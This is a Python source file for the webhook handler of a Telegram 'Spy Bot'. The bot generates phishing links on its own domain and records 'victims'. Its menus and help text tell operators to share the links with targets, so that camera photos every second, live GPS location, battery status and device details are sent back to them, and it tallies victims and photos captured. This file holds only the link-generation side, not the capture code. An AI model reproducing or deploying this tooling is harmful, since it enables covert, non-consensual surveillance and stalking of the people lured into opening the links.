import json
import os
import secrets
import string
from datetime import datetime
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse
import requests
from config import CONFIG

LINKS_FILE = os.path.join(CONFIG['data_dir'], 'links.json')
VISITORS_FILE = os.path.join(CONFIG['data_dir'], 'visitors.json')

def ensure_files():
    for file_path in [LINKS_FILE, VISITORS_FILE]:
        if not os.path.exists(file_path):
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'w') as f:
                json.dump({}, f)

def load_json(file_path):
    ensure_files()
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_json(file_path, data):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'w') as f:
        json.dump(data, f)

def generate_random_code(length=6):
    """Generate random code for phishing link"""
    chars = string.ascii_letters + string.digits + "#@!$"
    return ''.join(secrets.choice(chars) for _ in range(length))

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        data['reply_markup'] = reply_markup
    
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/answerCallbackQuery"
    try:
        requests.post(url, json={'callback_query_id': callback_id}, timeout=5)
    except:
        pass

def handle_update(update, host_url):
    """Handle incoming updates"""
    try:
        # Handle both message and callback query
        if 'message' in update:
            message = update['message']
            chat_id = message.get('chat', {}).get('id')
            text = message.get('text', '')
            user_id = message.get('from', {}).get('id')
            
            if not chat_id:
                return
            
            # /start command
            if text == '/start':
                keyboard = {
                    "inline_keyboard": [
                        [{"text": "🔗 Generate Spy Link", "callback_data": "generate"}],
                        [{"text": "📊 My Victims", "callback_data": "stats"}],
                        [{"text": "ℹ️ Help", "callback_data": "help"}]
                    ]
                }
                send_message(chat_id, 
                    "👾 *NexxonExploits Spy Bot*\n\n"
                    "🔒 Advanced tracking & monitoring system\n\n"
                    "📸 Features:\n"
                    "• Auto camera capture every second\n"
                    "• Live GPS location tracking\n"
                    "• Battery status monitoring\n"
                    "• Device information gathering\n\n"
                    "👇 Click below to generate spy link!",
                    json.dumps(keyboard))
            
            # Handle URL generation
            elif text and (text.startswith('http://') or text.startswith('https://')):
                try:
                    # Generate phishing link format: domain.com/userid?=code
                    random_code = generate_random_code()
                    
                    # Extract base domain from host URL
                    parsed_host = urlparse(host_url)
                    base_domain = parsed_host.netloc
                    
                    # Create phishing link
                    phishing_link = f"https://{base_domain}/{user_id}?={random_code}"
                    
                    # Save link data
                    links_db = load_json(LINKS_FILE)
                    links_db[random_code] = {
                        'url': text,
                        'user_id': user_id,
                        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'victims': 0
                    }
                    save_json(LINKS_FILE, links_db)
                    
                    send_message(chat_id,
                        f"✅ *Spy Link Generated!*\n\n"
                        f"🔗 `{phishing_link}`\n\n"
                        f"📊 Target: {text}\n"
                        f"🆔 User ID: `{user_id}`\n"
                        f"🔑 Code: `{random_code}`\n\n"
                        f"📸 When victim opens link:\n"
                        f"• Camera photos every second\n"
                        f"• Real-time GPS location\n"
                        f"• Battery status updates\n\n"
                        f"⚠️ *Share this link to start tracking!*")
                    
                except Exception as e:
                    send_message(chat_id, f"❌ Error generating link: {str(e)}")
            
            else:
                send_message(chat_id, 
                    "❌ *Invalid URL!*\n\n"
                    "Please send a valid URL starting with http:// or https://\n\n"
                    "Example: `https://google.com`")
        
        # Handle callback queries (button clicks)
        elif 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback.get('id')
            callback_data = callback.get('data')
            callback_chat_id = callback.get('from', {}).get('id')
            
            if not callback_id or not callback_chat_id:
                return
            
            if callback_data == 'generate':
                send_message(callback_chat_id,
                    "📥 *Create Spy Link*\n\n"
                    "Send me the target URL you want to redirect victims to.\n\n"
                    "Example: `https://youtube.com`\n\n"
                    "I'll generate a phishing link like:\n"
                    "`domain.com/your-userid?=random-code`")
                answer_callback(callback_id)
            
            elif callback_data == 'stats':
                all_visitors = load_json(VISITORS_FILE)
                my_visitors = {vid: data for vid, data in all_visitors.items() 
                              if str(data.get('generated_by', '')) == str(callback_chat_id)}
                
                total = len(my_visitors)
                total_photos = sum(v.get('photos', 0) for v in my_visitors.values())
                
                send_message(callback_chat_id,
                    f"📊 *Your Statistics*\n\n"
                    f"👥 Total Victims: {total}\n"
                    f"📸 Photos Captured: {total_photos}\n\n"
                    f"🔗 Generate more links to track more people!")
                answer_callback(callback_id)
            
            elif callback_data == 'help':
                send_message(callback_chat_id,
                    "ℹ️ *How to Use*\n\n"
                    "1️⃣ Click 'Generate Spy Link'\n"
                    "2️⃣ Send target URL (where victim will be redirected)\n"
                    "3️⃣ Get your phishing link\n"
                    "4️⃣ Share the link with victim\n"
                    "5️⃣ When they click, tracking starts!\n\n"
                    "📸 Photos, 📍 Location, 🔋 Battery will be sent to you automatically!")
                answer_callback(callback_id)
    
    except Exception as e:
        print(f"Error handling update: {e}")

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle incoming webhook from Telegram"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            update = json.loads(post_data)
            
            # Get host URL from request
            host = self.headers.get('Host', '')
            protocol = 'https' if self.headers.get('X-Forwarded-Proto') == 'https' else 'http'
            host_url = f"{protocol}://{host}"
            
            handle_update(update, host_url)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'ok': True}).encode())
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({'ok': False, 'error': str(e)}).encode())
    
    def do_GET(self):
        """Health check endpoint"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Bot is Running!</h1><p>Telegram Spy Bot Active</p>')
